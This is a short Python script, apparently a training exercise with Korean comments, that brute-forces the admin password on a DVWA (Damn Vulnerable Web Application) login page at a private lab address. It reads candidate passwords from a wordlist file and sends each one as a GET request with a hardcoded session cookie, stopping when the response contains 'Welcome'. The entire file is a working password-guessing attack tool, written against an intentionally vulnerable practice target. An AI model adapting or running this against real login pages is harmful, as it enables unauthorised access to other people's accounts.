import requests
import time

class brute_force:
    # 초기화
    def __init__(self):
        self._login_url = f"http://192.168.60.136/dvwa/vulnerabilities/brute/"
    
    def _login(self, username, password, login):
        login_data = {
            "username" : username,
            "password" : password,
            "Login" : login
        }
        cookie = {
            "PHPSESSID" : "cd41f426a2991b4cffdb991f91e89db8",
            "security" : "low"
        }

        resp = requests.get(self._login_url, params=login_data, cookies=cookie)
        return resp
    
    def _query(self, password):
        resp = self._login("admin", password, "Login#")
        return resp

    # find password
    def _find_password(self, response, password):
        if "Welcome" in response.text:
            pw = password
            return pw
        else:
            return None

    # attack methods
    def _brute_force_attack(self):
        # password list 파일 읽기
        with open('./password_list.txt', mode='r') as f:
            lines = f.readlines()
            for line in lines:
                print(f"input password: {line}",end='')
                password_query = self._query(line[0:-1])
                pw = self._find_password(password_query, line[0:-1])
                
                if pw is not None:
                    return pw
        return "비밀번호를 찾을 수 없습니다."
    
if __name__ == "__main__":
    start = int(time.time())
    bf = brute_force()
    print("Finding password:")
    pw = bf._brute_force_attack()
    print(f"Password of the admin is: {pw}")
    print(f"run time(sec) : {int(time.time()) - start}(sec)", )